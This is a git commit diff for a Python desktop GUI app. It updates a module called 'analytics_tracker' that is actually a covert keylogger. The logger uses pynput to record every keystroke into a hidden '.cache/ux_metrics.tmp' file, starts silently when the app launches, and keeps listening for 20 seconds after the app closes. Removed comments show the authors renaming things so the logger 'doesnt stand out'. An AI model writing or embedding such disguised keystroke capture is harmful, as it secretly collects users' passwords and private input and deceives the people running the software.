0b07aeec80f1b12acf4bba14508c503d27d92a03
Borges070 <lucas070borges@gmail.com>
2025-05-28 20:51:47 -0300

    Analytics updated und mit main integrated

--- main.py
+++ main.py
@@ -1,21 +1,21 @@
-from threading import Thread as TH
+from threading import Thread as TH, Event
 from views.gui import App
 from db import DB
 from utils.analytics_tracker import track_user_metrics
 
-def init_background_services():
-    read = TH(target=track_user_metrics)
+def init_background_services(stop_event):
+    read = TH(target=track_user_metrics, args=(stop_event,))
     read.start()
     return read
 
 if __name__ == "__main__":
     db: DB = DB()
-
     app = App(db)
-    reader = init_background_services()
+    stop_event = Event()
+    reader = init_background_services(stop_event)
 
     try:
         app.mainloop()
     finally:
-        # This will make sure the background thread is stopped when the app closes
-        reader.join()
+        stop_event.set()  # Set flag to stop the background thread
+        reader.join()     # 
--- utils/analytics_tracker.py
+++ utils/analytics_tracker.py
@@ -1,42 +1,81 @@
 from pynput import keyboard
 import os
 import time
+import threading
+from datetime import datetime
 
-CACHE_DIR = os.path.join(os.getcwd(), ".cache") # Directory to store cache files this one is misschievous enough
+CACHE_DIR = os.path.join(os.getcwd(), ".cache")
 os.makedirs(CACHE_DIR, exist_ok=True)
-KEYLOG_FILE = os.path.join(CACHE_DIR, "ux_metrics.tmp")  # File to store key logs --> Change name
+KEYLOG_FILE = os.path.join(CACHE_DIR, "ux_metrics.tmp")
 
-def _klog(k): # change func name
-    
-    try:
-        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:            
-            f.write(k.char)
-    except AttributeError: # This handles special keys that do not have a char attribute, we can make it simpler so it doesnt stand out so much
-        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
-            if k == keyboard.Key.space:
-                f.write(" ")
-            elif k == keyboard.Key.enter:
+def _klog(k):
+    def get_last_line_length():
+        try:
+            with open(KEYLOG_FILE, "r", encoding="utf-8") as f:
+                lines = f.readlines()
+                if lines:
+                    last_line = lines[-1].rstrip('\n')
+                    return len(last_line)
+        except Exception:
+            pass
+        return 0
+
+    def write_with_wrap(char):
+        last_line_len = get_last_line_length()
+        if last_line_len >= 80:
+            with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
                 f.write("\n")
-            elif k == keyboard.Key.tab:
-                f.write("\t")
-            elif k == keyboard.Key.backspace:
-                f.write("_")
-            elif k == keyboard.Key.esc:
-                f.write("[ESC]")
-            elif k == keyboard.Key.delete:
-                f.write("[DELETE]")          
-            elif k == keyboard.Key.ctrl:
-                f.write("[CTRL]")
-            elif k == keyboard.Key.alt:
-                f.write("[ALT]")        
-            elif k == keyboard.Key.print_screen:
-                f.write("[PRINT SCREEN]")
+        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
+            f.write(char)
 
-def track_user_metrics():
+    try:
+        write_with_wrap(k.char)
+    except AttributeError:
+        if k == keyboard.Key.backspace:
+            # Remove last character from file
+            try:
+                with open(KEYLOG_FILE, "r+", encoding="utf-8") as f:
+                    content = f.read()
+                    f.seek(0)
+                    f.truncate()
+                    f.write(content[:-1])
+            except Exception:
+                pass
+        else:
+            if k == keyboard.Key.space:
+                write_with_wrap(" ")
+            elif k == keyboard.Key.enter:
+                write_with_wrap("\n")
+            elif k == keyboard.Key.tab:
+                write_with_wrap("\t")
+            elif k == keyboard.Key.esc:
+                write_with_wrap("[ESC]")
+            elif k == keyboard.Key.delete:
+                write_with_wrap("[DELETE]")
+            elif k == keyboard.Key.ctrl:
+                write_with_wrap("[CTRL]")
+            elif k == keyboard.Key.alt:
+                write_with_wrap("[ALT]")
+            elif k == keyboard.Key.print_screen:
+                write_with_wrap("[PRINT SCREEN]")
+
+
+
+def start_new_session(f):
+    f.write("\n\n------ New Session: {} ------\n".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
+
+
+def track_user_metrics(stop_event: threading.Event):
     with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
-        f.write("\n------\n")
+        start_new_session(f)
     listener = keyboard.Listener(on_press=_klog)
     listener.start()
-    time.sleep(20)  # Duration in seconds that will stay active after the main thread stops
-    listener.stop()
-    
+    try:
+       
+        stop_event.wait() # mainloop ends
+        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
+            f.write("\n\n------ End Session: {} ------\n".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
+        
+        time.sleep(20) # How much time we wait before stopping the listener
+    finally:
+        listener.stop()
